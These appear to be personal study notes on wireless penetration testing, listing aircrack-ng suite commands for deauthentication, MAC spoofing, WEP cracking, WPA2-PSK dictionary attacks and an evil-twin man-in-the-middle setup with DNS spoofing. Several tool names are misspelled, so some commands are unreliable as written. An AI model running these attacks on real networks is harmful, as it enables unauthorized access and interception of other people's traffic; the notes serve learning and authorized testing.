# Wireless security chalenges
- Cannot see, feel or sense medium
- Extends beyond premise 
- Mobility
- Difficult to track attacker
- Passive attacks possible

# key terms
**SSID**
	- The network 'name' that can be seen is used to connnect. (example: CGN WiFi)
**ESSID**
	- SSID that may be the same accross multiple access points. Can be thought of as network name. 
**Station**
	- A wireless client
**BSSID**
	- MAC address of an access point.
**WPA2-PSK**
	- Authentication using the same password for all users.
**WPA2-EAP**
	- Authentication using usernames and password pair which is sent to RADIUS.
**RADIUS**
	- A server that authenticates users (not just for wifi).

# General commands
1. **View information and configuration**
	1. `ifconfig`
	2. `iwconfig`
	3. `airmon-ng`
2. **Turn interface on or off**
	1. `ifconfig <int> up`
	2. `ifconfig <int> down`
3. **Restart network manager**
	1. `service NetworkManager restart`
4. **WLAN regulatory domain**
	1. `iw reg get` --> get regulatory domain
	2. `iw reg set <name>` --> set regulatory domain
5. **change power of a wireless inetface (change range)**
	1. `iwconfig wlan0 txpower 40`


# Promiscious mode 
- Sniff all packets (Monitoring mode for wireless)
- `airmon-ng start <int> <channel (optional)>` --> make a new wireless int in monitoring mode. use this in wireshark.

* Wireless devices can only operate at one channel at a time. This is hardware limitation. To maximize packet capture, channel hopping must be done. To do this, we can use 
- `aerodump-ng <int>` --> specify bands depending on hardware capabilities.

# Frames of interest
There are 3 types of packets in a WLAN.
1. Management
2. Control
3. Data
Various 802.11 frames are exchanged between the AP and station, some which can be useful for pentesters. 

## Beacon frames
Beacon frames are advertised by APs to make themselves known. Beacon frames are a type of management frame. The tagged parameter in beacon frames contain the following: 
- **SSID 
- Supported rates
- **Current channel 
- Vendor specific information 
Beacon frames are unencrypted and as such, can be abused by attackers. Attackers can inject arbritrary beacon frames into the network. 
- `mdk3 --help b` --> more info
This can be used for misassociation class of attacks. 

## Probe frames 
Broadcast by *stations* to find APs. Probe requests can also be sent to find specific APs that the device has connected to in the past. APs will respond with *probe response* after recieving probe frames. 

# 3 stages of connection 
**Stage 1**: Unauthenticated and unassociated.

**Stage 2**: Authenticated and unassociated.

**Stage 3**: Autenticated and associated.

Data can be transmitted after stage 3. **If station recieves de-authentication packet from AP, it will revert back to stage 1.**

# Discovering hidden SSID
Hidden SSIDs are not included in the beacon frame. This is in attempt to hide the network from malicious actors (security through obsucation). However, SSID *is included* in probe packets and association packets. 

An attacker can wait passively for these packets, or can flood the network with de-authentication packets which will reset all the connections. When the clients reconnect, the attacker can sniff these packets. 
`airreplay-ng --deauth 0 -a <bssid> <int>`

# Bypassing MAC filter
MAC filters are ineffective security measures that attempt to limit access to the network to whitelisted addresses only. The concept is similar to post security. The attacker can simply spoof the MAC address of a trusted device. 
 
 ## Methodology
 - `airreplay-ng --fakeauth <delay> -e <ssid> <int>` --> check if mac filter enabled
 - `aerodump-ng`--> steal MAC address
 - `airreplay-ng --fakeauth <delay> -e <ssid> -h <MAC addr> <int>` 

# Open Authentication 
Open authentication means no password. 

# WEP hacking
Wired equivalent privacy (WEP) is outdated and easy to crack. WEP uses symmetric key encryption. WEP keys can be discovered after caputring suffecient packets. WEP pointers: 
1. WEP uses RC4 which is a stream cipher.
2. RC4 keystream is XOR with plaintext for encryption. 

![wep encryption](https://i.imgur.com/R5MAxmM.png)

![wep decryption](https://i.imgur.com/tjSXuy4.png)
## ARP Replay attack
- `airdump-ng -c <channel> <mon int> --bssid <MAC> --write <file>` --> output file can be used for aircrack
- `airrepay-ng --deauth 0 --essid <ssid> <int>` --> disconnect client to stimulate the network
- `airreplay-ng --airreplay -e <ssid> -h <client MAC> <int>` --> Spam ARP packets to collect more IVs
- `aircrack-ng <file>`--> crack

## Message injection attacks
collection method similar to ARP replay attack. 
### Cafe latte attacks
- `airodump-ng -c <channel> <int>`
- `airbase-ng -W 1 -e <SSID> -c <channel> <int>`
- `airbase-ng -c 1 -e <essid> <int> -w 1 -L -x <number>`
- `airodump-ng -c <channel> <int>`
### Korek's chopchop attack
- `airreplay-ng --chopchop -e <ssid> <int>`
### Hirte Attack
- `airodump-ng -c <channel> <int> --write <file>`
- `airbase-ng -c <channel> -e <ssid> -W 1 <int> -N`
- `aircrack-ng <file>`

# WPA(2)-PSK hacking
The key used for encryption is called **PTK**. PTK generation is generation is done via the 4 way handshake.
![](https://www.researchgate.net/profile/Nicolas-Sklavos/publication/235760646/figure/fig2/AS:299660037115914@1448455928384/The-RSNA-4-Way-Handshake.png)

### PTK generation 
1. Anounce (found in message 2)
2. Snounce (found in message 1 and 3)
3. Client MAC
4. AP MAC
5. PMK --> generated from password and SSID (PBKDF2)

## Dictionary attack
- `airodump-ng -c <channel> <int> --wirte <file>`
- `cowpatty -d <rainbow table> -s <SSID> -r < .cap file> ` --> alternatively use pyrit

# MitM attacks (hotspot)
## Methodology
- Create an evil twin:
	- Same SSID
	- same BSSID (optional)
- Deauth attack to breack connection with legitimate AP. 
- If evil-twin has higher signal strength, client will connect to it. 
## Commands
- `airodum-ng <int>` --> get BSSID, SSID, & channel
- `ifconfig <int> <channel>` --> put monitoring int in same channel
- `airbase-ng -a <enter MAC> -e <SSID> <int> `
	- Also creates a 'wired' interface. 
		- `ifconfig <wired int> up` --> use this to monitor (wireshark)
- `aireplay-ng --deauth 0 -a <Genuine BSSID> <int>`
### Wait for APIPA (or use DHCP)
- Graticious ARP will be advertised by client --> seen in wireshark
- `ifconfig <int> <ip> netmask <subnet mask> up` --> put 'physical' interface in same network 
- IP level connection established. 

### Route traffic
- `brctl addbr <name>` --> make new bridged interface
	- `brctl show` --> view details
- `brctl addif <name> <int>`
	- run twice --> int = 'physical int (at0)' & int with internet access
- `ifconfig <int> 0.0.0.0 up`
	- run twice for both int
- `ifconfig <bridge int> up`
- `dnclient3 <bridge int> &` --> only works for virtualbox
- `dnspoof -i <bridge int>`
- Configure proxy --> burp or deligated

(we might need to setup multiple AP if we dont know security configuration)

# Aditional rescources
- This [playlist](https://www.youtube.com/playlist?list=PLrrgFyE6PtlbhCflEC4QQKt6ZlQBVHq4z) by Vivek Ramachandran
- This [cheatsheet](https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet) by Ivan Sincek
